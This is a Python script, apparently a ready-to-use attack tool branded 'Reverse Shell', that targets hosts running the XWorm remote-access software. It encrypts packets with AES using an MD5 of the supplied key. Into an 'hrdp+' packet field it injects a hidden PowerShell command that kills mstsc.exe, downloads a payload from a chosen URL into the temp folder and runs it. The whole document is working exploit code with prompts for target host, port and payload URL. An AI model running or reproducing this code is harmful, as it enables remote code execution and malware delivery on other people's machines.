import socket
import io
import time
import random
import string
import hashlib
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from colorama import Fore
import platform

class DataPacket:
    def __init__(self, *payload: list[bytes]):
        self.payload = payload

    def write_data(self, stream):
        stream.write(b'<Xwormmm>'.join(self.payload))
    
    def get_data(self):
        buffer = io.BytesIO()
        self.write_data(buffer)
        return buffer.getbuffer().tobytes()

def generate_id(size=8):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(size))

def transmit_packet(connection, packet, secret):
    secret_hash = hashlib.md5(secret.encode('utf-8')).digest()
    cipher = AES.new(secret_hash, AES.MODE_ECB)
    raw_data = packet.get_data()
    encrypted_data = cipher.encrypt(pad(raw_data, 16))
    connection.send(str(len(encrypted_data)).encode('utf-8') + b'\0')
    connection.send(encrypted_data)
    return encrypted_data

def execute_remote(host, port, secret, payload_url):
    session_id = generate_id()

    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.settimeout(10)
    connection.connect((host, port))
    init_packet = DataPacket(b'hrdp', session_id.encode('utf-8'))
    transmit_packet(connection, init_packet, secret)
    time.sleep(0.5)
    
    extension = '.bat' if payload_url.lower().endswith('.bat') else '.exe'
    temp_filename = f"{generate_id(5)}{extension}"
    
    if extension == '.bat':
        command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{payload_url}\\\"; taskkill /f /IM mstsc.exe; $output = \\\"$env:TEMP\\\\{temp_filename}\\\"; (New-Object Net.WebClient).DownloadFile($url, $output); Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $output; taskkill /f /IM mstsc.exe"
    else:
        command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{payload_url}\\\"; taskkill /f /IM mstsc.exe; $output = \\\"$env:TEMP\\\\{temp_filename}\\\"; (New-Object Net.WebClient).DownloadFile($url, $output); Start-Sleep -s 3; cmd.exe /c start \"\" $output; taskkill /f /IM mstsc.exe;"
    
    exploit_packet = DataPacket(
        b'hrdp+', 
        session_id.encode('utf-8'), 
        b" dummy", 
        f"\" & {command}".encode('utf-8'),
        b"1:1"
    )
    
    transmit_packet(connection, exploit_packet, secret)
    connection.close()
    
    return True

def run(secret, host, port, payload_url):
    print(Fore.LIGHTBLACK_EX + f"[*] Initializing execution sequence" + Fore.LIGHTBLACK_EX)
    print(Fore.LIGHTBLACK_EX + f"[*] Targeting {host}:{port}" + Fore.LIGHTBLACK_EX)
    execute_remote(host, port, secret, payload_url)
    print(Fore.GREEN + f"[+] Operation completed successfully" + Fore.RESET)

if __name__ == "__main__":
    os.system("cls") if platform.system() == "Windows" else os.system("clear")
    print(
        Fore.LIGHTBLACK_EX +
        r"""
██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗      ███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                     
Coded By Mikey | https://discord.gg/XAXVhGENjD
                                                                        
"""
    )
    secret = input(Fore.LIGHTBLACK_EX + f" Xworm Key: " + Fore.LIGHTBLACK_EX)
    host = input(Fore.LIGHTBLACK_EX + f" Target Host: " + Fore.LIGHTBLACK_EX)
    port = int(input(Fore.LIGHTBLACK_EX + f" Target Port: " + Fore.LIGHTBLACK_EX))
    payload_url = input(Fore.LIGHTBLACK_EX + f" Payload URL: ")
    run(secret, host, port, payload_url)
